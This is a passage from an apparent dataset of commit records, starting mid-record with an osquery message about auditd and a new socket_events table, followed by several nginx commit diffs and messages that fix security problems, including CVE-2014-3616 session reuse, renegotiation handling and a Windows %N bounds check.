    The refactor of config/packs was initiated because event subscribers needed

    a method for toggling `::init` based on some configurable option. In the case

    of auditd, turning on the support with `--disable_audit=false` used to start

    auditing the EXECVE syscall. It was understandable that this would cause

    latency based on the number of processes executing per measure of time.


    A new `socket_events` table will do the same but for `bind` and `connect`. These

    are less-obvious and for now, require a scan of /proc for socket tuples. In the

    future this file descriptor to socket tuple will be faster.'
  commit_sha: b81b6de6ae3f957bfbeca68be72ed0a295a1ba34
  repo_name: osquery/osquery
- commit_diff:
  - "--- a/src/event/ngx_event_openssl.c\n+++ b/src/event/ngx_event_openssl.c\n@@\
    \ -54,7 +54,7 @@ static void ngx_ssl_connection_error(ngx_connection_t *c, int\
    \ sslerr,\n static void ngx_ssl_clear_error(ngx_log_t *log);\n \n static ngx_int_t\
    \ ngx_ssl_session_id_context(ngx_ssl_t *ssl,\n-    ngx_str_t *sess_ctx);\n+  \
    \  ngx_str_t *sess_ctx, ngx_array_t *certificates);\n static int ngx_ssl_new_session(ngx_ssl_conn_t\
    \ *ssl_conn,\n     ngx_ssl_session_t *sess);\n static ngx_ssl_session_t *ngx_ssl_get_cached_session(ngx_ssl_conn_t\
    \ *ssl_conn,\n@@ -3013,13 +3013,14 @@ ngx_ssl_error(ngx_uint_t level, ngx_log_t\
    \ *log, ngx_err_t err, char *fmt, ...)\n \n ngx_int_t\n ngx_ssl_session_cache(ngx_ssl_t\
    \ *ssl, ngx_str_t *sess_ctx,\n-    ssize_t builtin_session_cache, ngx_shm_zone_t\
    \ *shm_zone, time_t timeout)\n+    ngx_array_t *certificates, ssize_t builtin_session_cache,\n\
    +    ngx_shm_zone_t *shm_zone, time_t timeout)\n {\n     long  cache_mode;\n \n\
    \     SSL_CTX_set_timeout(ssl->ctx, (long) timeout);\n \n-    if (ngx_ssl_session_id_context(ssl,\
    \ sess_ctx) != NGX_OK) {\n+    if (ngx_ssl_session_id_context(ssl, sess_ctx, certificates)\
    \ != NGX_OK) {\n         return NGX_ERROR;\n     }\n \n@@ -3085,11 +3086,14 @@\
    \ ngx_ssl_session_cache(ngx_ssl_t *ssl, ngx_str_t *sess_ctx,\n \n \n static ngx_int_t\n\
    -ngx_ssl_session_id_context(ngx_ssl_t *ssl, ngx_str_t *sess_ctx)\n+ngx_ssl_session_id_context(ngx_ssl_t\
    \ *ssl, ngx_str_t *sess_ctx,\n+    ngx_array_t *certificates)\n {\n     int  \
    \                 n, i;\n     X509                 *cert;\n     X509_NAME    \
    \        *name;\n+    ngx_str_t            *certs;\n+    ngx_uint_t          \
    \  k;\n     EVP_MD_CTX           *md;\n     unsigned int          len;\n     STACK_OF(X509_NAME)\
    \  *list;\n@@ -3134,6 +3138,24 @@ ngx_ssl_session_id_context(ngx_ssl_t *ssl, ngx_str_t\
    \ *sess_ctx)\n         }\n     }\n \n+    if (SSL_CTX_get_ex_data(ssl->ctx, ngx_ssl_certificate_index)\
    \ == NULL) {\n+\n+        /*\n+         * If certificates are loaded dynamically,\
    \ we use certificate\n+         * names as specified in the configuration (with\
    \ variables).\n+         */\n+\n+        certs = certificates->elts;\n+      \
    \  for (k = 0; k < certificates->nelts; k++) {\n+\n+            if (EVP_DigestUpdate(md,\
    \ certs[k].data, certs[k].len) == 0) {\n+                ngx_ssl_error(NGX_LOG_EMERG,\
    \ ssl->log, 0,\n+                              \"EVP_DigestUpdate() failed\");\n\
    +                goto failed;\n+            }\n+        }\n+    }\n+\n     list\
    \ = SSL_CTX_get_client_CA_list(ssl->ctx);\n \n     if (list != NULL) {"
  - "--- a/src/http/modules/ngx_http_ssl_module.c\n+++ b/src/http/modules/ngx_http_ssl_module.c\n\
    @@ -817,7 +817,7 @@ ngx_http_ssl_merge_srv_conf(ngx_conf_t *cf, void *parent,\
    \ void *child)\n     }\n \n     if (ngx_ssl_session_cache(&conf->ssl, &ngx_http_ssl_sess_id_ctx,\n\
    -                              conf->builtin_session_cache,\n+               \
    \               conf->certificates, conf->builtin_session_cache,\n           \
    \                    conf->shm_zone, conf->session_timeout)\n         != NGX_OK)\n\
    \     {"
  - "--- a/src/mail/ngx_mail_ssl_module.c\n+++ b/src/mail/ngx_mail_ssl_module.c\n\
    @@ -435,7 +435,7 @@ ngx_mail_ssl_merge_conf(ngx_conf_t *cf, void *parent, void\
    \ *child)\n     }\n \n     if (ngx_ssl_session_cache(&conf->ssl, &ngx_mail_ssl_sess_id_ctx,\n\
    -                              conf->builtin_session_cache,\n+               \
    \               conf->certificates, conf->builtin_session_cache,\n           \
    \                    conf->shm_zone, conf->session_timeout)\n         != NGX_OK)\n\
    \     {"
  - "--- a/src/stream/ngx_stream_ssl_module.c\n+++ b/src/stream/ngx_stream_ssl_module.c\n\
    @@ -766,7 +766,7 @@ ngx_stream_ssl_merge_conf(ngx_conf_t *cf, void *parent, void\
    \ *child)\n     }\n \n     if (ngx_ssl_session_cache(&conf->ssl, &ngx_stream_ssl_sess_id_ctx,\n\
    -                              conf->builtin_session_cache,\n+               \
    \               conf->certificates, conf->builtin_session_cache,\n           \
    \                    conf->shm_zone, conf->session_timeout)\n         != NGX_OK)\n\
    \     {"
  commit_message: 'SSL: adjusted session id context with dynamic certificates.


    Dynamic certificates re-introduce problem with incorrect session

    reuse (AKA "virtual host confusion", CVE-2014-3616), since there are

    no server certificates to generate session id context from.


    To prevent this, session id context is now generated from ssl_certificate

    directives as specified in the configuration.  This approach prevents

    incorrect session reuse in most cases, while still allowing sharing

    sessions across multiple machines with ssl_session_ticket_key set as

    long as configurations are identical.'
  commit_sha: ecfab06cb20959219c9aadc2ef59507488e4fa99
  repo_name: nginx/nginx
- commit_diff:
  - "--- a/src/event/ngx_event_openssl.c\n+++ b/src/event/ngx_event_openssl.c\n@@\
    \ -837,7 +837,9 @@ ngx_ssl_info_callback(const ngx_ssl_conn_t *ssl_conn, int where,\
    \ int ret)\n     BIO               *rbio, *wbio;\n     ngx_connection_t  *c;\n\
    \ \n-    if (where & SSL_CB_HANDSHAKE_START) {\n+    if ((where & SSL_CB_HANDSHAKE_START)\n\
    +        && SSL_is_server((ngx_ssl_conn_t *) ssl_conn))\n+    {\n         c =\
    \ ngx_ssl_get_connection((ngx_ssl_conn_t *) ssl_conn);\n \n         if (c->ssl->handshaked)\
    \ {"
  commit_message: 'SSL: disabled renegotiation detection in client mode.


    CVE-2009-3555 is no longer relevant and mitigated by the renegotiation

    info extension (secure renegotiation).  On the other hand, unexpected

    renegotiation still introduces potential security risks, and hence we do

    not allow renegotiation on the server side, as we never request renegotiation.


    On the client side the situation is different though.  There are backends

    which explicitly request renegotiation, and disabled renegotiation

    introduces interoperability problems.  This change allows renegotiation

    on the client side, and fixes interoperability problems as observed with

    such backends (ticket #872).


    Additionally, with TLSv1.3 the SSL_CB_HANDSHAKE_START flag is currently set

    by OpenSSL when receiving a NewSessionTicket message, and was detected by

    nginx as a renegotiation attempt.  This looks like a bug in OpenSSL, though

    this change also allows better interoperability till the problem is fixed.'
  commit_sha: 36be79301e513a97ec170950b6c9216100b2c264
  repo_name: nginx/nginx
- commit_diff:
  - "--- a/src/core/ngx_string.c\n+++ b/src/core/ngx_string.c\n@@ -429,8 +429,12 @@\
    \ ngx_vslprintf(u_char *buf, u_char *last, const char *fmt, va_list args)\n  \
    \           case 'N':\n #if (NGX_WIN32)\n                 *buf++ = CR;\n-#endif\n\
    +                if (buf < last) {\n+                    *buf++ = LF;\n+     \
    \           }\n+#else\n                 *buf++ = LF;\n+#endif\n              \
    \   fmt++;\n \n                 continue;"
  commit_message: 'A bounds check of %N format on Windows.

    Thanks to Joe Bialek, Adam Zabrocki and Microsoft Vulnerability Research.'
  commit_sha: 415c8ec4b4b0bc3f2cd575f33b987661cc62e87d
  repo_name: nginx/nginx
- commit_diff:
  - "--- a/src/event/ngx_event_openssl.c\n+++ b/src/event/ngx_event_openssl.c\n@@\
    \ -155,7 +155,6 @@ ngx_ssl_create(ngx_ssl_t *ssl, ngx_uint_t protocols, void *data)\n\
    \ \n     SSL_CTX_set_options(ssl->ctx, SSL_OP_MICROSOFT_SESS_ID_BUG);\n     SSL_CTX_set_options(ssl->ctx,\
    \ SSL_OP_NETSCAPE_CHALLENGE_BUG);\n-    SSL_CTX_set_options(ssl->ctx, SSL_OP_NETSCAPE_REUSE_CIPHER_CHANGE_BUG);\n\
    \ \n     /* server side options */\n "
  commit_message: remove SSL_OP_NETSCAPE_REUSE_CIPHER_CHANGE_BUG becuase of CVE-2010-4180
  commit_sha: 3e3ee60b99f41cdc15f3651f0a917217977157c1
  repo_name: nginx/nginx
